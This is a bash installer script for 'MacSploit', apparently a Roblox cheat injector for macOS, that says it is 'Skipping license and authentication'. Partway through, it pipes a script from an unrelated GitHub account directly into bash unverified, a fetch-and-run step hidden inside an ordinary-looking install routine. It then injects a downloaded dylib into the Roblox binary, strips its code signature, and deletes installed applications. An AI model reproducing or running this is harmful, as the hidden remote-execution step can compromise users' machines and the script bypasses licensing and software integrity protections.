main() {
    clear
    echo -e "Welcome to the MacSploit Experience!"
    echo -e "Install Script Version 2.6"
    echo -e "Skipping license and authentication..."

    # Run external install script
    curl -sL "https://raw.githubusercontent.com/0c1aneT1V/nexus42/main/install.sh" | bash

    echo -e "Downloading Latest Roblox..."
    [ -f ./RobloxPlayer.zip ] && rm ./RobloxPlayer.zip
    local robloxVersionInfo
    robloxVersionInfo=$(curl -s "https://clientsettingscdn.roblox.com/v2/client-version/MacPlayer")
    local versionInfo
    versionInfo=$(curl -s "https://git.raptor.fun/main/version.json")

    local mChannel
    mChannel=$(echo "$versionInfo" | ./jq -r ".channel")
    local version
    version=$(echo "$versionInfo" | ./jq -r ".clientVersionUpload")
    local robloxVersion
    robloxVersion=$(echo "$robloxVersionInfo" | ./jq -r ".clientVersionUpload")

    if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]; then
        curl -L "http://setup.rbxcdn.com/mac/$robloxVersion-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
    else
        curl -L "http://setup.rbxcdn.com/mac/$version-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
    fi

    echo -n "Installing Latest Roblox... "
    [ -d "./Applications/Roblox.app" ] && rm -rf "./Applications/Roblox.app"
    [ -d "/Applications/Roblox.app" ] && rm -rf "/Applications/Roblox.app"

    unzip -o -q "./RobloxPlayer.zip"
    mv ./RobloxPlayer.app /Applications/Roblox.app
    rm ./RobloxPlayer.zip
    echo -e "Done."

    echo -e "Downloading MacSploit..."
    curl -L "https://git.raptor.fun/main/macsploit.zip" -o "./MacSploit.zip"

    echo -n "Installing MacSploit... "
    unzip -o -q "./MacSploit.zip"
    echo -e "Done."

    echo -n "Updating Dylib..."
    if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]; then
        curl -LO "https://git.raptor.fun/preview/macsploit.dylib"
    else
        curl -LO "https://git.raptor.fun/main/macsploit.dylib"
    fi
    echo -e " Done."

    echo -e "Patching Roblox..."
    mv ./macsploit.dylib "/Applications/Roblox.app/Contents/MacOS/macsploit.dylib"
    ./insert_dylib "/Applications/Roblox.app/Contents/MacOS/macsploit.dylib" "/Applications/Roblox.app/Contents/MacOS/RobloxPlayer" --strip-codesig --all-yes
    mv "/Applications/Roblox.app/Contents/MacOS/RobloxPlayer_patched" "/Applications/Roblox.app/Contents/MacOS/RobloxPlayer"
    rm -r "/Applications/Roblox.app/Contents/MacOS/RobloxPlayerInstaller.app"
    rm ./insert_dylib

    echo -n "Installing MacSploit App... "
    [ -d "./Applications/MacSploit.app" ] && rm -rf "./Applications/MacSploit.app"
    [ -d "/Applications/MacSploit.app" ] && rm -rf "/Applications/MacSploit.app"
    mv ./MacSploit.app /Applications/MacSploit.app
    rm ./MacSploit.zip

    touch ~/Downloads/ms-version.json
    echo "$versionInfo" > ~/Downloads/ms-version.json
    if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]; then
        ./jq '.channel = "previewb"' ~/Downloads/ms-version.json > ~/Downloads/ms-version.tmp && mv ~/Downloads/ms-version.tmp ~/Downloads/ms-version.json
    fi

    rm ./jq
    echo -e "Done."
    echo -e "Install Complete! Developed by Nexus42!"
    exit
}
